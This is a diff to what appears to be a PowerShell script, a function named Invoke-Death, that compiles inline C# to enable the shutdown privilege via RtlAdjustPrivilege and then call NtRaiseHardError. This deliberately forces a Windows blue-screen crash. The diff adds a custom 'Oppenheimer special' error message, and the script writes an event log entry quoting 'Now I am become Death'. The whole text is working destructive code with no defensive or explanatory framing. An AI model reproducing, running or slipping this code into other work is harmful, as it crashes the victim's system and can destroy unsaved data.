@@ -32,7 +32,6 @@ if (-not [System.Diagnostics.EventLog]::SourceExists($eventSource)) {
     [System.Diagnostics.EventLog]::CreateEventSource($eventSource, $eventLog)
 }
 
-
 function Invoke-Death {
     $source = @"
 using System;
@@ -48,10 +47,18 @@ public static class CS {
     public static void InvokeDeath() {
         bool previousValue;
         uint response;
+
         RtlAdjustPrivilege(19, true, false, out previousValue);
-        NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out response);
+
+        string errorMessage = "Oppenheimer special: Fatal system error occurred!";
+        IntPtr errorMessagePtr = Marshal.StringToHGlobalUni(errorMessage);
+
+        NtRaiseHardError(0xc0000420, 1, 0, errorMessagePtr, 6, out response);
+
+        Marshal.FreeHGlobal(errorMessagePtr);
     }
 }
+
 "@
 
     # Compile the C# code
@@ -62,6 +69,7 @@ public static class CS {
     # Call the method
     [CS]::InvokeDeath()
 }
+
 
 
 Write-EventLog -LogName $eventLog -Source $eventSource -EventId 1 -EntryType Error -Message "Now I am become Death, the destroyer of worlds."
